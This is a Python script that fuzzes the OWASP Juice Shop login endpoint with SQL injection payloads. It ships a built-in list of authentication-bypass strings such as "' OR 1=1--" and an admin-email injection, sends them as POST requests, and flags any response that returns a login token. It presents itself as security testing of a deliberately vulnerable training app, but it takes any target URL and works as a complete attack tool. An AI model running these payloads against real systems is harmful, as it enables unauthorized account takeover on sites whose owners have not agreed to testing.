#!/usr/bin/env python3
"""
OWASP Juice Shop SQL Injection Fuzzing Tool
============================================

This script performs automated SQL injection testing against the Juice Shop login endpoint.
It systematically tests various SQL injection payloads to identify authentication bypass vulnerabilities.

Author: Security Testing Team
Target: Juice Shop /rest/user/login endpoint
Method: POST request fuzzing with malicious SQL payloads
"""

import requests
import json
import time
import sys
import os
from urllib.parse import urljoin

class JuiceShopSQLiFuzzer:
    """
    Automated SQL injection fuzzer for OWASP Juice Shop
    """
    
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.login_endpoint = "/rest/user/login"
        self.session = requests.Session()
        self.results = []
        self.successful_bypasses = []
        
        # Request headers
        self.headers = {
            "Content-Type": "application/json",
            "User-Agent": "JuiceShop-SQLi-Fuzzer/1.0"
        }
        
        print(f"[+] Initializing SQL injection fuzzer for {base_url}")
        
    def load_sql_payloads(self, filename="sql_payloads.txt"):
        """
        Load SQL injection payloads from file
        """
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            print(f"[+] Loaded {len(payloads)} SQL injection payloads from {filename}")
            return payloads
        except FileNotFoundError:
            print(f"[-] Payload file {filename} not found, using default payloads")
            # Fallback to hardcoded payloads
            return self.get_default_payloads()
    
    def get_default_payloads(self):
        """
        Default SQL injection payloads for SQLite
        """
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin' OR '1'='1'--",
            "admin' OR 1=1--",
            "' OR 'a'='a",
            "' OR 1=1 LIMIT 1--",
            "' UNION SELECT 1,2,3--",
            "' OR rowid=1--",
            "' OR oid=1--",
            "' OR _rowid_=1--",
            "test@test.com' OR 1=1--",
            "' OR email='admin@juice-sh.op'--"
        ]
    
    def test_sql_injection(self, payload, field="email"):
        """
        Test a single SQL injection payload
        """
        url = urljoin(self.base_url, self.login_endpoint)
        
        # Prepare test data
        if field == "email":
            test_data = {
                "email": payload,
                "password": "test123"
            }
        else:
            test_data = {
                "email": "test@test.com",
                "password": payload
            }
        
        try:
            # Send the malicious request
            response = self.session.post(
                url,
                json=test_data,
                headers=self.headers,
                timeout=10
            )
            
            # Analyze the response
            result = {
                "payload": payload,
                "field": field,
                "status_code": response.status_code,
                "response_size": len(response.content),
                "response_time": response.elapsed.total_seconds(),
                "headers": dict(response.headers),
                "response_preview": response.text[:200]
            }
            
            # Check for successful SQL injection indicators
            success_indicators = self.analyze_response(response, payload)
            result.update(success_indicators)
            
            # Log results
            if result.get("sql_injection_success"):
                print(f"[!] SQL INJECTION SUCCESS: {payload[:50]}...")
                print(f"    Status: {response.status_code}, Size: {len(response.content)}")
                self.successful_bypasses.append(result)
            elif result.get("potential_vulnerability"):
                print(f"[?] POTENTIAL VULN: {payload[:50]}... (Status: {response.status_code})")
            else:
                print(f"[.] No injection: {payload[:30]}... (Status: {response.status_code})")
                
            return result
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Network error with payload '{payload[:30]}...': {e}")
            return {
                "payload": payload,
                "field": field,
                "error": str(e),
                "sql_injection_success": False
            }
    
    def analyze_response(self, response, payload):
        """
        Analyze HTTP response to determine if SQL injection was successful
        """
        content = response.text.lower()
        status = response.status_code
        
        result = {
            "sql_injection_success": False,
            "authentication_bypass": False,
            "potential_vulnerability": False,
            "indicators": []
        }
        
        # Check for successful authentication bypass
        auth_success_indicators = [
            "token", "jwt", "authentication", "welcome", "admin", "login successful"
        ]
        
        # Check for SQL error messages
        sql_error_indicators = [
            "sql", "syntax error", "sqlite", "database", "query", "statement"
        ]
        
        # Check for successful authentication
        if status == 200:
            for indicator in auth_success_indicators:
                if indicator in content:
                    result["sql_injection_success"] = True
                    result["authentication_bypass"] = True
                    result["indicators"].append(f"auth_success: {indicator}")
                    break
        
        # Check for SQL errors (potential vulnerability)
        if status == 500:
            for indicator in sql_error_indicators:
                if indicator in content:
                    result["potential_vulnerability"] = True
                    result["indicators"].append(f"sql_error: {indicator}")
                    break
        
        # Check response size anomalies
        if status == 200 and len(response.content) > 500:
            result["potential_vulnerability"] = True
            result["indicators"].append("large_response_size")
        
        return result
    
    def run_comprehensive_fuzzing(self):
        """
        Execute comprehensive SQL injection fuzzing campaign
        """
        print("\n" + "="*60)
        print("STARTING COMPREHENSIVE SQL INJECTION FUZZING")
        print("="*60)
        
        # Load payloads
        payloads = self.load_sql_payloads()
        if not payloads:
            print("[-] No payloads available, exiting")
            return
        
        # Test connectivity
        try:
            test_response = self.session.get(self.base_url, timeout=5)
            print(f"[+] Target connectivity verified (Status: {test_response.status_code})")
        except requests.exceptions.RequestException as e:
            print(f"[-] Target unreachable: {e}")
            return
        
        print(f"[+] Starting fuzzing with {len(payloads)} payloads")
        print(f"[+] Target: {self.base_url}{self.login_endpoint}")
        
        # Fuzz email field
        print(f"\n[+] Testing email field...")
        for i, payload in enumerate(payloads, 1):
            print(f"[+] Payload {i}/{len(payloads)}: {payload[:40]}...")
            result = self.test_sql_injection(payload, "email")
            self.results.append(result)
            time.sleep(0.1)  # Rate limiting
        
        # Test a few payloads in password field
        print(f"\n[+] Testing password field (sample)...")
        for i, payload in enumerate(payloads[:5], 1):
            print(f"[+] Password payload {i}/5: {payload[:40]}...")
            result = self.test_sql_injection(payload, "password")
            self.results.append(result)
            time.sleep(0.1)
    
    def generate_comprehensive_report(self):
        """
        Generate detailed security assessment report
        """
        print("\n" + "="*60)
        print("GENERATING SECURITY ASSESSMENT REPORT")
        print("="*60)
        
        # Calculate statistics
        total_tests = len(self.results)
        successful_injections = len(self.successful_bypasses)
        potential_vulns = len([r for r in self.results if r.get("potential_vulnerability")])
        
        # Create comprehensive report
        report = {
            "metadata": {
                "tool": "JuiceShop SQL Injection Fuzzer",
                "version": "1.0",
                "target": self.base_url,
                "endpoint": self.login_endpoint,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
                "test_duration": "N/A"
            },
            "summary": {
                "total_tests": total_tests,
                "successful_bypasses": successful_injections,
                "potential_vulnerabilities": potential_vulns,
                "target_url": f"{self.base_url}{self.login_endpoint}"
            },
            "vulnerability_details": {
                "authentication_bypasses": self.successful_bypasses,
                "potential_vulnerabilities": [r for r in self.results if r.get("potential_vulnerability")]
            },
            "all_test_results": self.results,
            "recommendations": [
                "Implement input validation and sanitization",
                "Use parameterized queries/prepared statements",
                "Apply principle of least privilege to database accounts",
                "Implement proper error handling to avoid information disclosure",
                "Regular security testing and code review"
            ]
        }
        
        # Save detailed report
        report_filename = "python_fuzz_results.json"
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Print summary
        print(f"\n[+] FUZZING CAMPAIGN COMPLETE")
        print(f"[+] Total tests performed: {total_tests}")
        print(f"[+] Successful SQL injections: {successful_injections}")
        print(f"[+] Potential vulnerabilities: {potential_vulns}")
        print(f"[+] Detailed report saved: {report_filename}")
        
        if successful_injections > 0:
            print(f"\n[!] CRITICAL: SQL INJECTION VULNERABILITIES FOUND!")
            print(f"[!] Authentication bypass possible with {successful_injections} payloads:")
            for bypass in self.successful_bypasses[:5]:  # Show first 5
                print(f"    -> {bypass['payload']}")
        
        if potential_vulns > 0:
            print(f"\n[?] {potential_vulns} potential vulnerabilities detected (require manual verification)")
        
        return report

def main():
    """
    Main execution function
    """
    print("OWASP Juice Shop SQL Injection Fuzzer")
    print("=====================================")
    
    # Get target URL from command line or use default
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = "http://localhost:3000"
    
    print(f"Target: {target_url}")
    
    # Initialize fuzzer
    fuzzer = JuiceShopSQLiFuzzer(target_url)
    
    # Run fuzzing campaign
    fuzzer.run_comprehensive_fuzzing()
    
    # Generate report
    report = fuzzer.generate_comprehensive_report()
    
    # Exit with appropriate code
    if fuzzer.successful_bypasses:
        print("\n[!] SECURITY ASSESSMENT FAILED - Critical vulnerabilities found!")
        sys.exit(1)
    else:
        print("\n[+] Security assessment complete - No critical issues found")
        sys.exit(0)

if __name__ == "__main__":
    main()
